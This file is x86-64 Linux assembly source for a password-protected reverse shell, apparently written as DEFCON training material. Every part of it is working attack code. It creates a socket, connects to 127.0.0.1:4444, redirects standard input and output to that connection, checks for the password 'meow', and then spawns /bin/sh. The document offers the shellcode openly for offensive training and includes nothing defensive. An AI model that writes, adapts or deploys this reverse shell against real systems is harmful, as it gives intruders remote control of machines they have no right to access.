; password protected
; linux/x64 reverse shell 
; password: "meow", connects to 127.0.0.1:4444
; author: @cocomelonc for DEFCON training

section .text
    global _start

_start:
; create socket(AF_INET, SOCK_STREAM, 0)
    xor     rsi, rsi               ; clear rsi (protocol = IPPROTO_IP = 0)
    mul     rsi                    ; multiply rsi by rsi, clearing rdx and rax (does nothing)
    mov     al, 41                 ; syscall socket
    mov     rdi, 2                 ; AF_INET (address family)
    mov     rsi, 1                 ; SOCK_STREAM (socket type)
    syscall                       ; make the syscall (socket)
    ; rax now contains sockfd. saving it to rdi,
    ; because this is the first argument for connect and dup2.
    mov     rdi, rax

; connect(sockfd, &addr, sizeof(addr))
    xor     rax, rax
    push    rax                     ; 8 bytes of zero (padding)
    push    dword 0x0100007f        ; IP address 127.0.0.1
    push    word 0x5c11             ; port 4444 in big-endian
    push    word 2                  ; AF_INET (address family)
    mov     rsi, rsp                ; rsi points to the sockaddr_in structure
    mov     rdx, 16                 ; size of sockaddr_in structure
    mov     al, 42                  ; syscall connect
    syscall                         ; make syscall to connect (connect(sockfd, &addr, addrlen))

; duplicate file descriptors (stdin, stdout, stderr) to socket
    xor     rsi, rsi                ; starting with new_fd = 0 (stdin)
.dup_loop:
    mov     al, 33                  ; syscall dup2
    syscall                         ; make syscall to duplicate the fd
    inc     rsi                     ; move to the next file descriptor (stdout, then stderr)
    cmp     rsi, 3                  ; if rsi == 3, all descriptors are done
    jne     .dup_loop               ; otherwise, repeat for next file descriptor

; check password
.prompt:
; print "password?\n" (working version)
    xor     rax, rax
    push    rax
    mov     rax, 0x64726f7773736170  ; "password"
    push    rax
    mov     word [rsp+8], 0x0a3f    ; "?\n"
    mov     rsi, rsp
    mov     rax, 1
    mov     rdi, 1
    mov     rdx, 10
    syscall
    add     rsp, 16                 ; clean the stack

; read user input (we read more than needed to capture extra symbols)
    xor     rax, rax
    xor     rdi, rdi
    mov     rsi, rsp                ; read into stack
    mov     rdx, 128                ; read up to 128 bytes, we care about the result in RAX
    syscall

; check length of entered string.
; if user entered 'meow' and pressed Enter, read will return 5 (4 chars + '\n').
; we need to reject anything that is not 5.
    cmp     rax, 5                  ; syscall read() returns the number of bytes read in RAX
    jne     .incorrect_password     ; if it's not 5, password is wrong (too short or too long)

; compare the first 4 bytes to "meow" ("dirty" stupid method)
    mov     rdi, rsp                ; pointer to user input
    mov     rsi, 0x776f656d         ; "meow"
    cmp     byte [rdi], 'm'         ; compare first byte
    jne     .incorrect_password     ; if not 'm', exit

    cmp     byte [rdi+1], 'e'       ; compare second byte
    jne     .incorrect_password     ; if not 'e', exit

    cmp     byte [rdi+2], 'o'       ; compare third byte
    jne     .incorrect_password     ; if not 'o', exit

    cmp     byte [rdi+3], 'w'       ; compare fourth byte
    jne     .incorrect_password     ; if not 'w', exit

; if length and content are both correct, go to welcome message
    jmp     .welcome

.incorrect_password:
    mov     al, 60
    xor     rdi, rdi
    syscall

.welcome:
; print welcome and shell
    mov     rax, 0x0a656d6f636c6577 ; "welcome\n" in little-endian
    push    rax
    mov     rsi, rsp
    mov     rax, 1                  ; syscall number for write
    mov     rdi, 1                  ; file descriptor for stdout
    mov     rdx, 8                  ; length of the string
    syscall                         ; make the syscall (write) to send the string to stdout
    add     rsp, 8                  ; clean up the stack

; execve("/bin/sh", NULL, NULL)
    xor     rsi, rsi                ; clear rsi (null for argv[])
    mul     rsi                     ; multiply (clears rdx)
    push    rsi                     ; push null
    mov     rdi, 0x68732f6e69622f   ; "/bin/sh"
    push    rdi                     ; push "/bin/sh" onto the stack
    mov     rdi, rsp                ; rdi points to the "/bin/sh" string
    mov     al, 59                  ; syscall number for execve
    syscall                         ; make the syscall (execve) to start the shell

; safe exit
    mov     al, 60                  ; syscall number for exit
    xor     rdi, rdi                ; clear rdi (exit status 0)
    syscall                         ; make the syscall (exit)
